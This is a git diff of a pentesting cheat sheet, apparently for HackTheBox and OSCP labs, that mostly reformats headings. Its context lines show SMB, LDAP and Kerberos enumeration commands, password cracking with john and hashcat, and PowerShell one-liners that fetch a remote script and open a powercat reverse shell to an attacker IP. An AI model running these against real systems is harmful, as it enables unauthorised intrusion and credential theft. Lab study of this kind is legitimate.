@@ -137,7 +137,7 @@ retrieve the entire DNS zone data for the "cronos.htb" domain from the DNS serve
 dig @10.10.10.52 AXFR htb.local 
 dnsenum 10.10.10.52
 ```
-## Check smb/rpc
+### Check smb/rpc
 ```bash
 #smb/rpc
 smbclient -L 10.10.10.52 -N 
@@ -150,7 +150,7 @@ smbclient '\\10.129.143.225\shares' -U 'guest'%'' -c 'prompt OFF;recurse ON;lcd 
 Maybe mount files for better view
 mount -t cifs //10.10.10.192/profiles$ /mnt
 ```
-## Check nmap scripts
+### Check nmap scripts
 ```bash
 #nmap scripts
 nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.77.60
@@ -160,7 +160,7 @@ nmap -p 139,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb
 #enumerate krb users
 nmap 192.168.x.x -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='oscp.exam',userdb=/usr/share/seclists/Usernames/Names/names.txt
 ```
-## Check ldapsearch
+### Check ldapsearch
 ```bash
 #ldapsearch
 ldapsearch -x -H ldap://10.10.10.52 -b "dc=htb,dc=local"
@@ -173,7 +173,7 @@ ldapsearch -H ldap://$IP -b "DC=BLACKFIELD,DC=local" -D 'support@blackfield.loca
 
 Search sth new and back to dig
 ```
-## Check ldap with nmap and enum4linux
+### Check ldap with nmap and enum4linux
 ```bash
 nmap -p 389 --script ldap-search 10.10.10.161
 enum4linux 10.10.10.161 > enum4linux-results.txt
@@ -198,7 +198,7 @@ imapacket-mssqlclient oscp.exam/xxx:xxxx@192.168.x.x –windows-auth
 john –format=krb5tgs –wordlist=~/rockyou.txt /tmp/hashes.kerberoast
 ```
 
-## Kerbrute/CME/RCE/Check other common exploits
+### Kerbrute/CME/RCE/Check other common exploits
 ```bash
 powershell -c iex( iwr http://10.10.14.9/shell.ps1 -UseBasicParsing )
 IEX (New-Object System.Net.Webclient).DownloadString("http://MYIP/powercat.ps1");powercat -c MYIP -p 4444 -e powershell
@@ -325,6 +325,7 @@ knock -v 192.168.0.116 4 27391 159 -u<br/>
 TCP & UDP<br/>
 knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
 ## Brute Force
+### Johntheripper and cewl
 ```
 /usr/share/john/ssh2john.py key > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
@@ -341,7 +342,7 @@ cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10
 ```
 cat wordlist.txt| sort | uniq > new_word.txt
 ```
-## Hydra brute force
+### Hydra brute force
 Find mode if you forget: hashcat --help | grep -i "Kerberos"<br/>
 Check type: http-post-form? ssh? etc<br/>
 hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw<br/>
